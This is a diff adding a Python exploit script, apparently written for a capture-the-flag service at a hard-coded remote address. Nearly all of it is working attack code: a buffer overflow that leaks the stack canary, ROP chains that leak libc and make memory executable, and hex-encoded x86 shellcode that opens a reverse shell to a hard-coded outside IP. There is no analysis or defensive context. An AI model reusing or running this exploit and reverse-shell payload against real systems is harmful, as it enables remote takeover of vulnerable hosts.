@@ -1,0 +1,88 @@
+from PwnIOI import *
+
+#s = IOI(['192.168.0.85',8181])
+s = IOI(['110.10.212.130',8888])
+gadget = 0x08048eec # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+s.read_until('>')
+s.write('1\n')
+s.read_until(':')
+s.write('A'*(0x34-0xc+1))
+canary = u32(s.read_until('=')[-2-4:-2]) -0x41
+log(" Canary : 0x%x"%canary)
+s.read_until('>')
+s.write('1\n')
+s.read_until(':')
+rop = 'A'*(0x34-0xc)
+rop += p32(canary)
+rop += 'AAAA'*3
+rop += p32(0x8048700)
+rop += p32(gadget)
+rop += p32(4)
+rop += p32(0x804B064)
+rop += p32(4)
+rop += p32(0x0)
+rop += p32(0x8048A71)
+s.write(rop)
+s.read_until('>')
+s.write('3\n')
+s.read(1024)
+socket = u32(s.read(4))
+libc = socket - 0x19990
+log(" start: 0x%x"%socket)
+log(" libc: 0x%x"%libc)
+rop = 'A'*(0x34-0xc)
+rop += p32(canary)
+rop += "AAAA"*3
+rop += p32(0x80486E0)
+rop += p32(gadget)
+rop += p32(4)
+rop += p32(0x804B1f0)
+rop += p32(0x50)
+rop += p32(0)
+rop += p32(0x8048A71)
+s.read_until('>')
+s.write('1\n')
+s.read_until(':')
+s.write(rop)
+s.read_until('>')
+s.write('3\n')
+sc = "\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"+\
+"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"+\
+"\x77\xcc\x8e\x65"+\
+"\x66\x68"+\
+"\x82\x35"+\
+"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"+\
+"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+s.write(sc)
+rop = 'A'*(0x34-0xc)
+rop += p32(canary)
+rop += "AAAA"*3
+rop += p32(0x80486E0)
+rop += p32(gadget)
+rop += p32(4)
+rop += p32(0x804B014)
+rop += p32(0x4)
+rop += p32(0)
+rop += p32(0x8048A71)
+s.read_until('>')
+s.write('1\n')
+s.read_until(':')
+s.write(rop)
+s.read_until('>')
+s.write('3\n')
+s.write(p64(socket-0x6380))
+rop = 'A'*(0x34-0xc)
+rop += p32(canary)
+rop += "AAAA"*3
+rop += p32(0x80485C0)
+rop += p32(gadget+1)
+rop += p32(0x804B000)
+rop += p32(0x100000)
+rop += p32(0x7)
+rop += p32(0x804B1f0)
+s.read_until('>')
+s.write('1\n')
+s.read_until(':')
+s.write(rop)
+s.read_until('>')
+s.interact()
